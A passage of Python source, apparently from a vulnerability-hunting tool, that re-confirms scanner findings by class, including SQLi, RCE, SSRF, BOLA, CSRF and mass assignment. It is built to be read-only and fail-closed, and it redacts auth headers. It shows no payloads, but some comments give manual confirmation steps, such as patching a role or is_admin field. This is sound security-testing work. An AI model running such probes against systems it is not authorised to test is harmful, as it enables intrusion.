        return await _recheck_cloud_exposure(finding, fetch, timeout)
    if head == "subdomain_takeover":
        return await _recheck_subdomain_takeover(finding, fetch, timeout)
    if head == "host_header":
        return await _recheck_host_header(finding, fetch, timeout)
    if head == "access_control":
        return await _recheck_access_control(finding, fetch, timeout)
    # Two-account BOLA: the find_bola engine already proved a cross-user read with
    # owner+attacker+anon probes — that IS the independent confirmation. (Only the
    # engine's own findings get this trust; external ones fall through to re-test.)
    if (":bola:" in vt_full or head == "bola") and not _external \
            and finding.get("owner") and finding.get("attacker"):
        return True, 0.85, "two-account cross-user object read confirmed by the BOLA engine"
    # Web cache deception: the worker proved an anonymous request retrieved the
    # victim's private data from cache (the cache_confirmed flag). Trust that
    # two-identity proof (own findings only, not external).
    if head == "web_cache_deception" and not _external:
        if finding.get("cache_confirmed"):
            return True, 0.85, ("anonymous request retrieved the victim's private "
                                "data from cache — web cache deception confirmed")
        return False, 0.3, "web cache deception candidate — not confirmed (lead)"
    # Single-session IDOR candidate: auto-escalate to the two-account BOLA test
    # when two sessions are configured; otherwise stay a lead.
    if head == "idor":
        return await _recheck_idor(finding, fetch, timeout, bola_config)
    if head == "open_redirect":
        return await _recheck_open_redirect(finding, fetch, timeout)
    if head == "graphql_authz":     # two-identity field-authz — BEFORE the graphql* catch-all
        return await _recheck_graphql_authz(finding, fetch, timeout, bola_config)
    if head.startswith("graphql"):
        return await _recheck_graphql(finding, fetch, timeout)
    if head == "nosql_injection":
        return await _recheck_nosql(finding, fetch, timeout)
    if head == "ssrf":
        return await _recheck_ssrf(finding, fetch, timeout)
    if head in ("ldap_injection", "xpath_injection"):
        return await _recheck_query_injection(finding, fetch, timeout)
    # CSRF cannot be gate-CONFIRMED read-only: a tokenless POST form with a
    # SameSite-less session cookie is only forgeable if the server ALSO lacks an
    # Origin/Referer check or a double-submit-cookie defence — neither is visible in
    # the HTML, and proving their absence would require sending a forged cross-site
    # POST (a state-changing write the gate never performs). So it stays an actionable
    # lead. (Adversarially confirmed FP vector — kept out of the precision-1.00 set.)
    if head.startswith("csrf"):
        return False, 0.3, ("CSRF candidate: a state-changing form with no recognised "
                            "anti-CSRF token (and, for the form case, a SameSite-less "
                            "session cookie). Confirming means ruling out an Origin/Referer "
                            "or double-submit-cookie defence — not visible read-only — so "
                            "verify manually (lead)")
    if head == "jwt":
        return await _recheck_jwt(finding, fetch, timeout)
    # Mass assignment can only be PROVEN by a write (PATCH an extra/privileged field,
    # then read it back) — which violates VIPER's read-only-PoC rule, so the gate
    # never auto-confirms it. Return an actionable lead reason (surfaced by
    # `viper.py leads`) instead of the generic fallback, so the operator knows the
    # exact manual step: with an authenticated session, PATCH the self-owned object
    # adding a server-controlled field (e.g. role/is_admin — NEVER on a
    # money/transfer/delete path) and GET it back to see if the field stuck.
    if head == "mass_assignment":
        return False, 0.3, ("mass-assignment candidate: a response exposed a privileged "
                            "field on a self-owned object. Confirming requires a WRITE "
                            "(PATCH the field + read back), which the read-only gate will "
                            "not perform — verify manually with your own account (lead)")
    # Client-side prototype pollution: confirm with a real headless-browser DOM oracle
    # when Playwright is installed (navigate a __proto__ marker payload, read it back off
    # Object.prototype — unforgeable). Without a browser it stays a manual-review LEAD, so
    # precision never depends on a browser being present.
    if head == "prototype_pollution":
        return await _recheck_proto_pollution(finding, fetch, timeout)
    # Read-only surface detections whose CONFIRMATION would be destructive (an RCE
    # gadget for deserialization, poisoning a shared cache) or is inherently a config
    # observation (OAuth metadata) — all stay actionable manual-review leads.
    if head == "insecure_deserialization":
        return False, 0.3, ("insecure-deserialization SURFACE: serialized-object data "
                            "crosses the trust boundary. Confirming RCE needs a gadget-"
                            "chain payload (destructive) the gate never sends — verify "
                            "manually in a controlled test (lead)")
    if head == "web_cache_poisoning":
        return False, 0.3, ("web-cache-poisoning RISK: an unkeyed header reflected into a "
                            "cacheable response (probed safely with a cache buster + benign "
                            "marker). Confirming real impact means poisoning a SHARED cache "
                            "key, which affects other users — verify manually (lead)")
    if head == "oauth_misconfig":
        return False, 0.3, ("OAuth/OIDC config weakness observed in the discovery document "
                            "(metadata only). Whether the deployed client is actually "
                            "exploitable depends on the live flow — verify manually (lead)")

    # Classes with no SAFE read-only confirmation -> stay a LEAD (fail-closed):
    #   single-session idor  -> needs two accounts (use the two-account BOLA flow)
    #   nosql (query)        -> weaker divergence signal; no token differential
    #   business_logic       -> needs domain-specific corroboration
    return False, 0.0, f"no safe read-only re-test for '{head}' — manual review"

# Map the swarm workers' vuln_type strings (the head token before ':') to the
# FindingValidator dispatch keys. Grounded in the actual emitted vuln_types
# (grepped from core/swarm_workers/vuln/*.py). Unknowns fall back to a generic
# re-fetch validator, which is conservative (low confidence -> not submittable).
_VTYPE_MAP = {
    "sqli": "sqli", "sqli_blind": "sqli_blind", "auth_bypass": "sqli",
    "login_sqli": "sqli",
    "xss": "xss", "xss_text": "xss", "xss_tag": "xss", "dom_xss": "dom_xss",
    "rce": "cmdi", "cmdi": "cmdi", "command_injection": "cmdi",
    "lfi": "lfi", "path_traversal": "lfi",
    "ssti": "ssti", "ssti_error": "ssti",
    "ssrf": "ssrf",
    "cors": "cors", "cors_wildcard": "cors", "cors_origin_reflect": "cors",
    "cors_null_origin": "cors",
    "open_redirect": "open_redirect",
    "idor": "idor_enum", "bola": "idor_enum",
    "jwt": "jwt_none_alg",
    "xxe": "xxe_basic",
    "crlf_header_injection": "crlf_injection",
    "graphql_introspection": "graphql_introspection",
    "graphql_ide": "graphql_introspection", "graphql_endpoint": "graphql_introspection",
    "request_smuggling": "request_smuggling",
    "clickjacking_frameable": "clickjacking", "clickjacking": "clickjacking",
    "env_exposed": "env_file", "git_exposed": "git_exposure",
    "actuator_env": "debug_endpoints",
    # No dedicated validator yet -> generic re-fetch (conservative).
    "nosql_injection": "generic", "secret": "generic",
    "information_disclosure": "generic", "access_control": "generic",
    "business_logic": "generic", "mass_assignment": "generic", "nuclei": "generic",
}


def validator_key(vuln_type: str) -> str:
    """Normalize a swarm vuln_type to a FindingValidator dispatch key."""
    vt = (vuln_type or "").lower()
    head = vt.split(":")[0]
    return _VTYPE_MAP.get(head, _VTYPE_MAP.get(vt, "generic"))


class FetchHTTP:
    """Adapt the swarm fetch() to FindingValidator's http-client interface.

    Returns the HttpResp (it already exposes .status/.headers/.body); on a network
    failure returns a status-0 stub so validators that check ``status != 0`` skip
    gracefully — an un-reconfirmable finding then fails the gate (fail-closed).
    The request goes through the installed scope guard / proxy / rate limiter, so
    re-validation stays in scope and (if a session is installed) authenticated.
    """

    def __init__(self, timeout: float = 10.0):
        self.timeout = timeout

    async def request(self, method, url, *, headers=None, data=None, **kw):
        from core.swarm_workers.vuln._http import HttpResp, fetch
        body = data.encode() if isinstance(data, str) else data
        r = await fetch(method, url, headers=headers, body=body, timeout=self.timeout)
        return r if r is not None else HttpResp(0, {}, "", url)

    async def get(self, url, *, headers=None, **kw):
        return await self.request("GET", url, headers=headers)

    async def post(self, url, *, headers=None, data=None, **kw):
        return await self.request("POST", url, headers=headers, data=data)


# Header names whose VALUE is a secret and must be redacted before a request is
# persisted with a finding — a proof artifact must never carry a live token to disk.
_SENSITIVE_HEADERS = frozenset({
    "cookie", "authorization", "x-api-key", "x-auth-token", "api-key",
    "x-csrf-token", "x-xsrf-token", "proxy-authorization", "set-cookie",
})


def _redact_headers(headers) -> dict:
    return {k: ("<redacted>" if str(k).lower() in _SENSITIVE_HEADERS else v)
            for k, v in (headers or {}).items()}


def _clip_body(body):
    if body is None:
        return None
    if isinstance(body, (bytes, bytearray)):
        try:
            body = body.decode("utf-8", "replace")
        except Exception:  # noqa: BLE001
            return None
    return str(body)[:512]


class _RequestRecorder:
    """Wraps the gate's fetch to capture each (method, url, headers, body, status),
    so the EXACT request that independently confirmed a finding can be persisted as
    copyable repro. Auth header values are redacted — no live token ever hits disk."""

    def __init__(self, fetch):
        self._fetch = fetch
        self.calls: List[dict] = []

    async def __call__(self, method, url, **kw):
        resp = await self._fetch(method, url, **kw)
        try:
            self.calls.append({
                "method": method,
                "url": url,
                "headers": _redact_headers(kw.get("headers") or {}),
                "body": _clip_body(kw.get("body")),
                "status": getattr(resp, "status", None),
            })
        except Exception:  # noqa: BLE001 — recording must never affect the verdict
            pass
        return resp


async def validate_findings(
    findings: List[dict],
    *,
    default_target: str = "",
    min_confidence: float = 0.5,
    timeout: float = 10.0,
    validator=None,
    fetch=None,
    bola_config=None,
    oob_store=None,
) -> List[dict]:
    """Annotate each finding with an INDEPENDENT re-confirmation verdict.

    Adds to a COPY of each finding:
      validated              : bool   — an independent path reproduced it
      validation_confidence  : float  — calibrated confidence
      validation_reason      : str    — why it passed/failed
      submittable            : bool   — validated AND confidence >= min_confidence

    Default: a swarm-native behavioral re-test (_reconfirm) keyed on the finding's
    own shape, via the swarm fetch (so it runs through the hunt's scope/auth/proxy).
    Inject `validator` (an object with async validate(finding, target)) for tests
    or to use the legacy FindingValidator.
    """
    if validator is None and fetch is None:
        from core.swarm_workers.vuln._http import fetch as _swarm_fetch
        fetch = _swarm_fetch

    # Each finding's re-confirmation is INDEPENDENT (a fresh re-test keyed on the
    # finding's own shape), so they run concurrently (bounded) without affecting
    # each other's verdict — same fail-closed guarantees, far less wall-clock when
    # a hunt produces many candidates. Order is preserved by asyncio.gather.
    sem = asyncio.Semaphore(12)

    async def _validate_one(f: dict) -> dict:
        g = dict(f)
        vt = g.get("vuln_type", g.get("type", ""))
        rec = None
        async with sem:
            try:
                if validator is not None:
                    target = g.get("url") or g.get("target") or default_target
                    probe = dict(g)
                    norm = validator_key(vt)
                    probe["vuln_type"] = norm
                    probe["attack"] = norm
                    ok, conf, reason = await validator.validate(probe, target)
                else:
                    rec = _RequestRecorder(fetch)   # capture the confirming request(s)
                    ok, conf, reason = await _reconfirm(g, rec, timeout, bola_config,
                                                        oob_store=oob_store)
            except Exception as e:  # noqa: BLE001 — fail closed on any error
                ok, conf, reason = False, 0.0, f"validation error: {e}"
        g["validated"] = bool(ok)
        g["validation_confidence"] = round(float(conf), 3)
        g["validation_reason"] = reason
        g["submittable"] = bool(ok) and float(conf) >= min_confidence
        # Defense-in-depth (native gate path only): for classes where a timing-only
        # signal is not trustworthy — a tarpit or a load spike can fake a delay — an
        # EXECUTED-output reflection or an out-of-band interaction is REQUIRED before
        # a finding may be submittable, regardless of how min_confidence is tuned.
        # This makes "timing-only RCE can never be submittable" a structural
        # guarantee, not a numeric-threshold accident. (An injected custom validator
        # is an explicit operator override and is trusted as-is.)
        if g["submittable"] and validator is None and not _submittable_ok(g):
            g["submittable"] = False
            g["validation_reason"] = (reason + " | blocked: a timing-only signal is "
                                      "not submittable for this class (needs executed "
                                      "output or an out-of-band callback)")
        # Persist the EXACT request(s) the gate used to confirm this finding, for
        # copyable operator repro (auth redacted). The confirming probe is typically
        # the last request; keep the final few so a differential (baseline+attack) is
        # visible. Only for submittable findings, and only the native re-test path.
        if g["submittable"] and rec is not None and rec.calls:
            g["proof_requests"] = rec.calls[-4:]
        logger.debug("validate %s -> validated=%s conf=%.2f submittable=%s",
                     vt, g["validated"], g["validation_confidence"], g["submittable"])
        return g

    return list(await asyncio.gather(*[_validate_one(f) for f in findings]))


# Classes where a NON-orthogonal (timing-only) re-test must NEVER be enough to
# submit: a delay can be faked by a tarpit or a transient load spike, so only an
# EXECUTED-output reflection or an out-of-band interaction is trustworthy.
_STRICT_RETEST_CLASSES = {"cmdi", "rce", "command_injection"}
_TRUSTED_RETESTS = {"reflection_confirmed", "oob_confirmed"}


def _submittable_ok(finding: dict) -> bool:
    """Structural veto for the strict-retest classes: a cmdi/rce finding may only be
    submittable when its recheck was reflection- or OOB-confirmed (retest_type),
    never on a timing-only signal — no matter the confidence. Other classes pass."""
    head = (finding.get("vuln_type") or finding.get("type") or "").lower().split(":")[0]
    if head in _STRICT_RETEST_CLASSES:
        return finding.get("retest_type") in _TRUSTED_RETESTS
    return True


def partition(findings: List[dict]) -> Tuple[List[dict], List[dict]]:
    """Split annotated findings into (submittable, leads)."""
    submittable = [f for f in findings if f.get("submittable")]
    leads = [f for f in findings if not f.get("submittable")]
    return submittable, leads
